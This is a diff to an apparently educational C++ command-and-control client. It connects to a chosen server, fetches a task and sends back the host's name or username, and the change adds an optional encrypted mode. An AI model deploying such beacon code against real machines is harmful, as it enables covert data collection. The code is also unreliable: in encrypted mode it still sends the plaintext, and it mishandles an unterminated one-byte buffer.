@@ -1,4 +1,4 @@
-﻿#define _WINSOCK_DEPRECATED_NO_WARNINGS
+#define _WINSOCK_DEPRECATED_NO_WARNINGS
 
 #include <iostream>
 #include <winsock2.h>
@@ -111,10 +111,32 @@ string read_ip_from_file(const string& filename)
 	return ip;
 }
 
+bool question()
+{
+	while (true)
+	{
+		cout << "Do you want to ecnrypt the channel? (y/n): ";
+		char answer;
+		cin >> answer;
+		if (answer == 'y' || answer == 'Y')
+		{
+			cout << endl;
+			return true;
+		}
+		else if (answer == 'n' || answer == 'N')
+		{
+			cout << endl;
+			return false;
+		}
+		else
+			cout << "Invalid input. Please enter 'y' or 'n'." << endl;
+	}
+}
 
 int main()
 {
 	//МЕНЮ
+	bool encrypt_channel = NULL;
 	string connectionip;
 	cout << "Custom C2 channel for education" << endl << endl;
 	cout << "Please choose network mode: " << endl;
@@ -130,13 +152,15 @@ int main()
 		{
 			cout << "Localhost mode selected" << endl << endl;
 			connectionip = "127.0.0.1";
+			encrypt_channel = question();
 			break;
 		}
 		else if (choice == '2')
 		{
 			cout << "Remote server mode selected. Write your remote ip address: ";
 			cin >> connectionip;
-			cout << "Ip address: " << connectionip << endl << endl;
+			cout << "Ip address: " << connectionip << endl;
+			encrypt_channel = question();
 			break;
 		}
 		else if (choice == '3')
@@ -149,6 +173,7 @@ int main()
 			else
 			{
 				cout << "Remote server mode selected. Ip address: " << connectionip << endl;
+				encrypt_channel = question();
 				break;
 			}
 		}
@@ -194,28 +219,44 @@ int main()
 		else
 		{
 			wprintf(L"Successfully connected to server.\n");
-			const char* msg = "get_task";
+			if 	(encrypt_channel == true)
+			{
+				const char* msg = "get_task_enc";
+				send(s, msg, strlen(msg), 0);
+			}
+			else
+			{
+				const char* msg = "get_task";
+				send(s, msg, strlen(msg), 0);
+			}
 			char  task[1];
-			send(s, msg, strlen(msg), 0);
 			recv(s, task, 1, 0);
 			cout << "Received from server: " << task << endl << endl;
 			if (strcmp(task, "1") == 0)
 			{
 				char hostname[256];
 				gethostnameinfo(hostname, sizeof(hostname));
-				encryption(hostname, key, iv, encryptedtext);
-				packet.insert(packet.end(), iv, iv + 16);
-				packet.insert(packet.end(), encryptedtext.begin(), encryptedtext.end());
-				send(s, (const char*)packet.data(), packet.size(), 0);
+				if (encrypt_channel == true)
+				{
+					encryption(hostname, key, iv, encryptedtext);
+					packet.insert(packet.end(), iv, iv + 16);
+					packet.insert(packet.end(), encryptedtext.begin(), encryptedtext.end());
+					send(s, (const char*)packet.data(), packet.size(), 0);
+				}
+				send(s, hostname, strlen(hostname), 0);
 			}
 			if (strcmp(task, "2") == 0)
 			{
 				char username[256];
 				getusernameinfo(username, (DWORD)sizeof(username));
-				encryption(username, key, iv, encryptedtext);
-				packet.insert(packet.end(), iv, iv + 16);
-				packet.insert(packet.end(), encryptedtext.begin(), encryptedtext.end());
-				send(s, (const char*)packet.data(), packet.size(), 0);
+				if (encrypt_channel == true)
+				{
+					encryption(username, key, iv, encryptedtext);
+					packet.insert(packet.end(), iv, iv + 16);
+					packet.insert(packet.end(), encryptedtext.begin(), encryptedtext.end());
+					send(s, (const char*)packet.data(), packet.size(), 0);
+				}
+				send(s, username, strlen(username), 0);
 			}
 		}
 		closesocket(s);
